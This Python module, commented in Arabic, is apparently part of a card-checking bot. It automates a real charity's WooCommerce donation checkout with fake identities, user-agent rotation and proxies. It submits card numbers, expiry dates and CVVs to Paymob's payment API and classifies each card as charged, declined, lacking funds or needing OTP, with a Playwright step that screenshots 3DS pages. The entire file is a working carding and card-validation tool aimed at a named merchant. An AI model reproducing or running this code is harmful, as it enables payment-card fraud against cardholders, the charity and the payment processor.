"""
gate_paymob.py — Paymob (educateme-foundation.org) Gate
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Phase A (WooCommerce) → add to cart + checkout → يجيب pk + client_secret
Phase B (Paymob API)  → GET intention → POST pay → (3DS?) → inquiry
Phase C (Playwright)  → سكرين شوت حقيقي لصفحة الـ ACS لو طلب تحقق

⚠️ Phase A هي الحلقة الأضعف فى السلسلة: مبنية على استنساخ دقيق لطلب
واحد حقيقي اتسجل (HAR) لموقع WooCommerce معقّد (funnel builder plugin
wfacp + fkcart). أي تغيير فى إعدادات الموقع أو الـ nonce ممكن يكسرها.
Phase B و C مؤكدين 100% من بيانات حقيقية (نفس الحقول بالظبط).
"""

import re, io, time, random, string, threading, logging, requests

logger = logging.getLogger(__name__)

# ── Constants (من الـ HAR الحقيقي) ───────────────────────────────────────────
PM_SITE        = "https://educateme-foundation.org"
PM_PRODUCT_ID  = "13348"          # "Donate Now" — نفس المنتج اللي فى الـ HAR
PM_CHECKOUT_ID = "139795"
PAYMOB_API     = "https://accept.paymob.com"

_UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36 Edg/157.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
]

_FIRST = ["John","Michael","David","James","Robert","Ahmed","Omar","Karim"]
_LAST  = ["Saad","Samy","Ramy","Magdy","Hassan","Farouk","Tarek"]
_DOMAINS = ["outlook.com","gmail.com","yahoo.com","hotmail.com"]


def _rand_identity():
    first = random.choice(_FIRST); last = random.choice(_LAST)
    uname = "".join(random.choices(string.ascii_lowercase, k=8))
    email = f"{uname}{random.randint(100,9999)}@{random.choice(_DOMAINS)}"
    fingerprint = "".join(random.choices("0123456789abcdef", k=32))
    return {"first": first, "last": last, "name": f"{first} {last}",
            "email": email, "fingerprint": fingerprint}


def _parse_proxy(proxy_str):
    """نفس منطق gate_kashier._parse_proxy — مستقل هنا عشان مفيش تعارض استيراد"""
    if not proxy_str:
        return None
    s = str(proxy_str).strip()
    m = re.match(r'https?://([^:@]+):([^@]+)@([^:]+):(\d+)', s)
    if m:
        scheme = s.split('://')[0]
        user, passwd, host, port = m.groups()
        url = f"{scheme}://{user}:{passwd}@{host}:{port}"
        return {"http": url, "https": url}
    m = re.match(r'socks5h?://([^:@]+):([^@]+)@([^:]+):(\d+)', s)
    if m:
        user, passwd, host, port = m.groups()
        url = f"socks5h://{user}:{passwd}@{host}:{port}"
        return {"http": url, "https": url}
    return None


# ── Phase A: WooCommerce → Paymob checkout URL ───────────────────────────────
def _get_fresh_paymob_session(proxy_dict, ua, ident):
    """
    يعيد إنتاج تدفق WooCommerce الحقيقي (add-to-cart → checkout → place
    order) عشان يوصل لرابط Paymob اللي فيه public_key + client_secret
    طازة. بيرجع (public_key, client_secret) أو (None, None) لو فشل.
    """
    sess = requests.Session()
    headers = {
        "User-Agent": ua,
        "Accept-Language": "en-US,en;q=0.9",
    }

    try:
        # 1) زيارة صفحة المنتج (Donate Now) — عشان نجيب كوكيز + nonce أولي
        r0 = sess.get(f"{PM_SITE}/product/donate-now/", headers=headers,
                      proxies=proxy_dict, timeout=20)
        if r0.status_code != 200:
            return None, None, f"product page HTTP {r0.status_code}"

        # 2) إضافة للسلة
        r1 = sess.get(
            f"{PM_SITE}/?add-to-cart={PM_PRODUCT_ID}",
            headers=headers, proxies=proxy_dict, timeout=20,
        )
        if r1.status_code != 200:
            return None, None, f"add-to-cart HTTP {r1.status_code}"

        # 3) صفحة الـ checkout — نجيب منها الـ nonce الحقيقي
        r2 = sess.get(f"{PM_SITE}/checkout/", headers=headers,
                      proxies=proxy_dict, timeout=20)
        html = r2.text
        m_nonce = re.search(r'name="woocommerce-process-checkout-nonce"\s+value="([a-f0-9]+)"', html)
        if not m_nonce:
            m_nonce = re.search(r'"createOrderNonce":"([a-f0-9]+)"', html)
        if not m_nonce:
            return None, None, "تعذر العثور على checkout nonce"
        nonce = m_nonce.group(1)

        # 4) إرسال الطلب (Place order) مع اختيار Paymob كبوابة دفع
        checkout_data = {
            "billing_first_name": ident["first"],
            "billing_last_name":  ident["last"],
            "billing_email":      ident["email"],
            "billing_phone":      "",
            "billing_country":    "EG",
            "shipping_country":   "EG",
            "ship_to_different_address": "on",
            "payment_method":     "paymob-5886818-card-vpc-egp",
            "terms-field":        "1",
            "terms":              "on",
            "woocommerce-process-checkout-nonce": nonce,
            "_wp_http_referer":   "/checkout/",
        }
        r3 = sess.post(
            f"{PM_SITE}/?wc-ajax=checkout",
            data=checkout_data,
            headers={**headers, "X-Requested-With": "XMLHttpRequest",
                     "Content-Type": "application/x-www-form-urlencoded"},
            proxies=proxy_dict, timeout=25,
        )
        try:
            rj = r3.json()
        except Exception:
            return None, None, f"checkout response not JSON: {r3.text[:150]}"

        redirect_url = rj.get("redirect", "")
        if not redirect_url:
            return None, None, f"no redirect in checkout response: {str(rj)[:150]}"

        # 5) استخرج public_key + client_secret من رابط التحويل لـ Paymob
        m_pk  = re.search(r'publicKey=([^&]+)', redirect_url) or re.search(r'pk=([^&]+)', redirect_url)
        m_csk = re.search(r'clientSecret=([^&]+)', redirect_url) or re.search(r'csk=([^&]+)', redirect_url)

        if not (m_pk and m_csk):
            # محاولة أخيرة: افتح صفحة التحويل وشوف الـ pk/csk جواها
            r4 = sess.get(redirect_url, headers=headers, proxies=proxy_dict, timeout=20)
            m_pk  = re.search(r'egy_pk_live_[A-Za-z0-9]+', r4.text)
            m_csk = re.search(r'egy_csk_live_[A-Za-z0-9]+', r4.text)
            if not (m_pk and m_csk):
                return None, None, "تعذر استخراج pk/csk من رابط Paymob"
            return m_pk.group(0), m_csk.group(0), None

        return m_pk.group(1), m_csk.group(1), None

    except requests.exceptions.ProxyError as e:
        return None, None, f"Proxy error: {str(e)[:80]}"
    except requests.exceptions.Timeout:
        return None, None, "Timeout فى مرحلة WooCommerce"
    except Exception as e:
        return None, None, f"{type(e).__name__}: {str(e)[:100]}"


# ── Phase B: Paymob API ───────────────────────────────────────────────────────
def check_paymob_gate(card_str: str, proxy=None):
    """
    Returns (status, reason, screenshot_bytes|None)
    """
    parts = card_str.split('|')
    if len(parts) != 4:
        return "INVALID_FORMAT", "صيغة خاطئة — مطلوب cc|mm|yyyy|cvv", None
    cc, month, year, cvv = parts
    if len(year) == 4:
        year = year[-2:]   # Paymob عايز سنتين بس

    proxy_dict = _parse_proxy(proxy) if proxy else None
    ua         = random.choice(_UA_POOL)
    ident      = _rand_identity()

    # ── Phase A ───────────────────────────────────────────────────────────────
    pk, csk, err = _get_fresh_paymob_session(proxy_dict, ua, ident)
    if err:
        logger.warning(f"[Paymob] {cc[:6]}... Phase A failed: {err}")
        return "ERROR", f"تعذر إنشاء جلسة دفع: {err}", None
    logger.info(f"[Paymob] {cc[:6]}... got pk={pk[:20]}... csk={csk[:20]}...")

    try:
        # ── Phase B.1: GET intention (payment_token) ────────────────────────────
        r1 = requests.get(
            f"{PAYMOB_API}/v1/intention/element/{pk}/{csk}/",
            headers={"User-Agent": ua, "Accept": "*/*",
                     "Origin": "https://eg.checkout.paymob.com",
                     "Referer": "https://eg.checkout.paymob.com/"},
            proxies=proxy_dict, timeout=20,
        )
        if r1.status_code != 200:
            return "ERROR", f"intention GET HTTP {r1.status_code}", None
        intention = r1.json()
        payment_token = (intention.get("payment_keys") or {}).get("card")
        merchant_domain = f"https://{intention.get('merchant_company_url') or PM_SITE.split('//')[1]}"
        if not payment_token:
            return "ERROR", f"مفيش payment_token فى رد الـ intention: {str(intention)[:150]}", None

        # ── Phase B.2: POST pay (إرسال الكارت) ──────────────────────────────────
        pay_payload = {
            "source": {
                "identifier": cc,
                "sourceholder_name": ident["name"].upper(),
                "subtype": "CARD",
                "expiry_month": month,
                "expiry_year": year,
                "cvn": cvv,
                "unified_checkout": "True",
                "save_card": False,
            },
            "payment_token": payment_token,
            "api_source": "IFRAME",
            "unified_checkout": "True",
            "save_card": False,
            "merchant-domain": PM_SITE,
            "fingerprint": ident["fingerprint"],
        }
        r2 = requests.post(
            f"{PAYMOB_API}/api/acceptance/payments/pay",
            json=pay_payload,
            headers={"User-Agent": ua, "Accept": "application/json, text/plain, */*",
                     "Content-Type": "application/json",
                     "Origin": "https://eg.checkout.paymob.com",
                     "Referer": "https://eg.checkout.paymob.com/"},
            proxies=proxy_dict, timeout=25,
        )
        try:
            pay_j = r2.json()
        except Exception:
            return "ERROR", f"pay response not JSON: HTTP {r2.status_code} {r2.text[:150]}", None

        logger.info(f"[Paymob] {cc[:6]}... pay HTTP {r2.status_code} "
                    f"3ds={pay_j.get('is_3d_secure')} msg={pay_j.get('data.message')}")

        is_3ds   = str(pay_j.get("is_3d_secure", "")).lower() == "true"
        redirect = pay_j.get("redirection_url", "")
        msg      = pay_j.get("data.message", "") or ""
        success  = str(pay_j.get("success", "")).lower() == "true"

        # ── حالة: مطلوب تحقق OTP/3DS ─────────────────────────────────────────
        if is_3ds and redirect:
            screenshot = None
            try:
                screenshot = _capture_acs_screenshot(redirect, proxy)
            except Exception as e:
                logger.warning(f"[Paymob] screenshot error: {e}")
            if not screenshot:
                screenshot = _build_fallback_image(cc[-4:], msg or "Pending 3DS Authorization")
            return "OTP", msg or "مطلوب تحقق OTP / 3D Secure من البنك", screenshot

        # ── حالة: نجاح مباشر (بدون 3DS) ───────────────────────────────────────
        if success:
            return "CHARGED", "تم الدفع بنجاح", None

        # ── حالة: رفض ─────────────────────────────────────────────────────────
        low = msg.lower()
        if "insufficient" in low or "balance" in low:
            return "INSUFFICIENT_FUNDS", msg, None
        if any(k in low for k in ("invalid", "expired", "incorrect")):
            return "DECLINED", msg or "رفض", None

        return "DECLINED", msg or f"رفض (غير محدد السبب): {str(pay_j)[:120]}", None

    except requests.exceptions.ProxyError as e:
        return "ERROR", f"Proxy error: {str(e)[:80]}", None
    except requests.exceptions.Timeout:
        return "ERROR", "Timeout", None
    except Exception as e:
        logger.error(f"[Paymob] {cc[:6]}... {type(e).__name__}: {e}")
        return "ERROR", f"{type(e).__name__}: {str(e)[:100]}", None


# ── Phase C: Playwright screenshot للـ ACS page ───────────────────────────────
def _capture_acs_screenshot(acs_url: str, proxy_str, width=1280, height=900, max_output_width=640):
    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        logger.warning("[Paymob] playwright غير مثبّت")
        return None

    from gate_kashier import _parse_proxy_for_playwright  # إعادة استخدام نفس المنطق
    pw_proxy = _parse_proxy_for_playwright(proxy_str) if proxy_str else None
    ua = random.choice(_UA_POOL)

    try:
        with sync_playwright() as pw:
            browser = pw.chromium.launch(
                headless=True, proxy=pw_proxy,
                args=["--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage"],
            )
            ctx = browser.new_context(viewport={"width": width, "height": height},
                                       user_agent=ua, locale="en-US")
            page = ctx.new_page()
            try:
                page.goto(acs_url, wait_until="domcontentloaded", timeout=25000)
                page.wait_for_timeout(2500)

                img_bytes = None
                for sel in ("form", "main", "[class*='container']",
                            "[class*='wrapper']", "[class*='card']"):
                    try:
                        el = page.locator(sel).first
                        if el.count() > 0 and el.is_visible():
                            box = el.bounding_box()
                            if box and box["width"] > 200 and box["height"] > 80:
                                img_bytes = el.screenshot(type="jpeg", quality=88)
                                break
                    except Exception:
                        continue
                if not img_bytes:
                    img_bytes = page.screenshot(type="jpeg", quality=88, full_page=True)

                try:
                    from PIL import Image, ImageChops
                    im  = Image.open(io.BytesIO(img_bytes)).convert("RGB")
                    bg  = Image.new("RGB", im.size, (255, 255, 255))
                    bbox = ImageChops.difference(im, bg).getbbox()
                    if bbox:
                        x0=max(0,bbox[0]-8); y0=max(0,bbox[1]-8)
                        x1=min(im.width,bbox[2]+8); y1=min(im.height,bbox[3]+8)
                        if (x1-x0)>100 and (y1-y0)>50:
                            im = im.crop((x0,y0,x1,y1))
                    if im.width > max_output_width:
                        ratio = max_output_width/im.width
                        im = im.resize((max_output_width, int(im.height*ratio)), Image.LANCZOS)
                    buf = io.BytesIO(); im.save(buf, format="JPEG", quality=85)
                    img_bytes = buf.getvalue()
                except Exception as e:
                    logger.warning(f"[Paymob] crop skipped: {e}")

                return img_bytes
            finally:
                ctx.close(); browser.close()
    except Exception as e:
        logger.warning(f"[Paymob] ACS screenshot failed: {type(e).__name__}: {e}")
        return None


def _build_fallback_image(card_last4, msg):
    from PIL import Image, ImageDraw, ImageFont
    W, H = 420, 140
    img = Image.new("RGB", (W, H), (40, 20, 20))
    d = ImageDraw.Draw(img)
    try:
        fb = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 13)
        fr = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 11)
    except Exception:
        fb = fr = ImageFont.load_default()
    d.rectangle([0,0,W,28], fill=(120,30,30))
    d.text((10,6), "⚠ تعذّر أخذ سكرين شوت حقيقي", font=fb, fill=(255,255,255))
    d.text((10,42), f"Card: **** {card_last4}", font=fr, fill=(255,210,180))
    d.text((10,64), msg[:55], font=fr, fill=(255,210,180))
    buf = io.BytesIO(); img.save(buf, format="PNG"); buf.seek(0)
    return buf.read()


# ── Retry wrapper ─────────────────────────────────────────────────────────────
_PM_SEMAPHORE = threading.Semaphore(3)

def check_paymob_with_retry(card_str: str, proxy=None):
    """
    Returns (status, reason, screenshot_bytes | None)

    proxy: نص بروكسي اختياري. لو مش متمرر، بنجيب واحد من ProxyPool بتاع
    البوت في كل محاولة (BrightData rotating أو الـ pool العادي).
    السكرين شوت بيرجع للكولر (bot._check_one_card) مش بيتخزن هنا.
    """
    last_status, last_reason, last_scr = "ERROR", "لم تكتمل أي محاولة", None
    with _PM_SEMAPHORE:
        for attempt in range(3):
            p = proxy
            if not p:
                try:
                    from bot import proxy_pool
                    p = proxy_pool.get_proxy()
                except Exception:
                    p = None
            scr = None
            try:
                status, reason, scr = check_paymob_gate(card_str, p)
            except Exception as e:
                status, reason = "ERROR", f"{type(e).__name__}: {str(e)[:80]}"
            logger.info(f"[Paymob] {card_str[:16]}... attempt {attempt+1} → {status}: {reason[:60]}")
            last_status, last_reason, last_scr = status, reason, scr
            if status in ("CHARGED", "INSUFFICIENT_FUNDS", "OTP", "DECLINED", "INVALID_FORMAT"):
                break
            if attempt < 2:
                time.sleep(2 + attempt)
    return last_status, last_reason, last_scr
